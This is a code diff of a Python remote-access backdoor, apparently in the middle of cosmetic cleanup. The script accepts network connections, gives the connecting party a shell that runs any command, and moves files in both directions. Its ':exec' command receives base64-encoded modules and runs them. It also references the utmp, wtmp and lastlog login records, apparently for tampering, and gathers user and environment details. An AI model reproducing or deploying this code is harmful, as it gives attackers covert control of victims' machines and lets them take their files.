@@ -36,7 +36,7 @@ UTMP_FILEPATH       = "/var/run/utmp"
 WTMP_FILEPATH       = "/var/log/wtmp"
 LASTLOG_FILEPATH    = "/var/log/lastlog"
 
-    ## Get user and environment information
+## Get user and environment information
 distro = os.uname()[1]
 distro2 = platform.linux_distribution()[0]
 Home_Dir = os.environ['HOME']
@@ -67,7 +67,7 @@ def handler(connection):
               )
         stdout, stderr = proc.communicate()
             
-        if cmd.startswith(':upload'):
+        if cmd.startswith(":upload"):
             getname = cmd.split(" ")
             rem_file = getname[1]
             filename = rem_file.replace("/","_")
@@ -80,7 +80,7 @@ def handler(connection):
             if not os.path.isfile(filename):
                 connection.send("[!] File upload failed! Please try again\n")
 
-        elif cmd.startswith(':download'):
+        elif cmd.startswith(":download"):
             getname = cmd.split(" ")
             loc_file = getname[1]
             if os.path.exists(loc_file) is True:
@@ -91,19 +91,19 @@ def handler(connection):
             else:
                 connection.send("[+] File not found!\n")
     
-        elif cmd.startswith(':exec'):
+        elif cmd.startswith(":exec"):
             getname = cmd.split(" ")        # split mod name from cmd
             modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
     
             mod_data = ""                   # Our received file data will go here 
             data = connection.recv(socksize)
             mod_data += data
-            #print("[+] Module recieved!")
+            #print("[+] Module recieved!") # Debug level message. Remove before distribution.
             connection.send("Complete")     # sends OK msg to the client
             modexec = b64decode(mod_data)   # decode the received file
             module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
 
-        elif cmd == ":quit":
+        elif cmd == (":quit"):
             print("[!] Closing server!")
             conn.close()
             os._exit(0)
@@ -121,7 +121,7 @@ def accept():
     while 1:   
         global connection                                  
         connection, address = conn.accept()
-        print "[!] New connection!"
+        print("[!] New connection!")
         connection.send("shell => ")
         reaper()
         childPid = os.fork()                     # forks the incoming connection and sends to conn handler
@@ -167,7 +167,7 @@ def save_file(filename):
         pass
 
 
-def cmd(command):
+def cmd_exec(command):
     proc = Popen(command,
               shell=True,
               stdout=PIPE,
@@ -175,7 +175,7 @@ def cmd(command):
                stdin=PIPE,
                )
     stdout, stderr = proc.communicate()
-    connection.sendall( stdout )              # Send output back to the client
+    connection.sendall( stdout )
 
 def cmd2txt(command, textfile):
     os.system("%s > %s" % (command, textfile))
